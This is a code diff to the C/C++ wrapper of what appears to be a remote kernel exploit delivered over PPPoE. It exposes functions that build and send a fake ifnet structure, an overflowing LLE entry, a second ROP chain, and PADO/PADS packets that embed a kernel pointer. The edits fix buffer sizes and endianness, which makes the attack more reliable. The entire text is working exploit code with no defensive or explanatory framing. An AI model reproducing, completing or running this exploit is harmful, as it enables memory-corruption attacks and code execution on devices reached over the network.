@@ -1,7 +1,12 @@
 #include "exploit.h"
+#include <EndianPortable.h>
 
 #define COPY_TO_BUFFER(buffer, packet) \
-    memcpy(buffer, packet.getRawPacket()->getRawData(), size), packet.getRawPacket()->getRawDataLen()
+    size < packet.getRawPacket()->getRawDataLen() ? 0 : memcpy(buffer, packet.getRawPacket()->getRawData(), packet.getRawPacket()->getRawDataLen()), packet.getRawPacket()->getRawDataLen()
+
+#ifndef htole64
+#define htole64
+#endif
 
 extern "C" {
 
@@ -53,51 +58,55 @@ void setTargetIpv6(const char *ipv6) {
 
 uint64_t buildFakeIfnet(uint8_t *buffer, uint64_t size) {
     auto data = Exploit::build_fake_ifnet(&exploit);
-    memcpy(buffer, data.data(), size);
+    memcpy(buffer, data.data(), data.size());
     return data.size();
 }
 
 uint64_t buildOverflowLle(uint8_t *buffer, uint64_t size) {
     auto data = Exploit::build_overflow_lle(&exploit);
-    memcpy(buffer, data.data(), size);
+    memcpy(buffer, data.data(), data.size());
     return data.size();
 }
 
 uint64_t buildFakeLle(uint8_t *buffer, uint64_t size) {
     auto data = Exploit::build_fake_lle(&exploit);
-    memcpy(buffer, data.data(), size);
+    memcpy(buffer, data.data(), data.size());
     return data.size();
 }
 
 uint64_t buildSecondRop(uint8_t *buffer, uint64_t size) {
     auto data = Exploit::build_second_rop(&exploit);
-    memcpy(buffer, data.data(), size);
+    memcpy(buffer, data.data(), data.size());
     return data.size();
 }
 
 int buildPado(uint8_t *buffer, uint64_t size, uint8_t *cookie, uint64_t cookie_size) {
+    uint64_t temp = htole64(exploit.pppoe_softc);
     pcpp::Packet &&packet = PacketBuilder::pado(exploit.source_mac, exploit.target_mac,
                                                 cookie, cookie_size,
-                                                (uint8_t * ) & exploit.pppoe_softc, sizeof(uint64_t));
+                                                (uint8_t * ) & temp, sizeof(uint64_t));
     return COPY_TO_BUFFER(buffer, packet);
 }
 
 void sendPado(uint8_t *cookie, uint64_t cookie_size) {
+    uint64_t temp = htole64(exploit.pppoe_softc);
     pcpp::Packet &&packet = PacketBuilder::pado(exploit.source_mac, exploit.target_mac,
                                                 cookie, cookie_size,
-                                                (uint8_t * ) & exploit.pppoe_softc, sizeof(uint64_t));
+                                                (uint8_t * ) & temp, sizeof(uint64_t));
     exploit.dev->sendPacket(&packet);
 }
 
 int buildPads(uint8_t *buffer, uint64_t size) {
+    uint64_t temp = htole64(exploit.pppoe_softc);
     pcpp::Packet &&packet = PacketBuilder::pads(exploit.source_mac, exploit.target_mac,
-                                                (uint8_t * ) & exploit.pppoe_softc, sizeof(uint64_t));
+                                                (uint8_t * ) & temp, sizeof(uint64_t));
     return COPY_TO_BUFFER(buffer, packet);
 }
 
 void sendPads() {
+    uint64_t temp = htole64(exploit.pppoe_softc);
     pcpp::Packet &&packet = PacketBuilder::pads(exploit.source_mac, exploit.target_mac,
-                                                (uint8_t * ) & exploit.pppoe_softc, sizeof(uint64_t));
+                                                (uint8_t * ) & temp, sizeof(uint64_t));
     exploit.dev->sendPacket(&packet);
 }
 
